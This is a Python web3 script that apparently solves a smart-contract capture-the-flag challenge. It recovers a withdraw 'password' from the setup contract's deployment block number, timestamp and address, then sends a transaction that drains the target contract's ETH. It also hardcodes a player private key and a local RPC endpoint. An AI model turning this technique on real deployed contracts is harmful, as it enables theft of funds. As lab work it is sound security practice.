import json
import time
import math
from web3 import Web3
from eth_account import Account

# add definition
Local_Ethereum_Endpoint = 'http://10.83.0.212:8545/9a676093-b62f-4054-ba6a-fb484e5ccbed'
private_key = '0x6845027a2c10ce77ddc8306c8df0efeece39a6614f474ee8841055e571bce45f'
setup_address = '0x4574719d7F8BEEa05A8F7E79094e1041E08434eC'

w3 = Web3(Web3.HTTPProvider(Local_Ethereum_Endpoint))
account = Account.from_key(private_key)

# ABI for functions we need
setup_abi = [
    {'inputs': [], 'name': 'TARGET', 'outputs': [{'type': 'address'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [], 'name': 'isSolved', 'outputs': [{'type': 'bool'}], 'stateMutability': 'view', 'type': 'function'}
]
chal_abi = [
    {'inputs': [{'name': 'password', 'type': 'uint256'}], 'name': 'withdraw', 'outputs': [], 'stateMutability': 'nonpayable', 'type': 'function'}
]

if not w3.is_connected():
    print('RPC error')
    exit()

setup_address = Web3.to_checksum_address(setup_address)
setup = w3.eth.contract(address=setup_address, abi=setup_abi)
chal_address = setup.functions.TARGET().call()
chal = w3.eth.contract(address=chal_address, abi=chal_abi)

print('[+] Player:', account.address)
print('[+] Setup:', setup_address)
print('[+] Chal:', chal_address)
print('[+] Balance:', w3.from_wei(w3.eth.get_balance(chal_address), 'ether'), 'ETH')

# find deployment block
left = 0
right = w3.eth.block_number
while left < right:
    mid = (left + right) // 2
    code = w3.eth.get_code(setup_address, block_identifier=mid)
    if len(code) > 0:
        right = mid
    else:
        left = mid + 1

block_number = left
if len(w3.eth.get_code(setup_address, block_identifier=block_number)) == 0:
    raise Exception('deployment block not found')

block = w3.eth.get_block(block_number)
timestamp = block['timestamp']
print('[+] Deployment block:', block_number)
print('[+] Timestamp:', timestamp)

# Solidity abi.encodePacked(uint256, uint256, address)
data = timestamp.to_bytes(32, 'big')
data += block_number.to_bytes(32, 'big')
data += bytes.fromhex(setup_address[2:])
password = int.from_bytes(Web3.keccak(data), 'big')
print('[+] Password:', password)

# test password first
chal.functions.withdraw(password).call({'from': account.address})
print('[+] Password verified')

# send transaction
tx = chal.functions.withdraw(password).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'chainId': w3.eth.chain_id,
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})
signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
print('[+] Transaction:', tx_hash.hex())
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print('[+] Receipt status:', receipt.status)
print('[+] Solved:', setup.functions.isSolved().call())
print('[+] Remaining balance:', w3.from_wei(w3.eth.get_balance(chal_address), 'ether'), 'ETH')
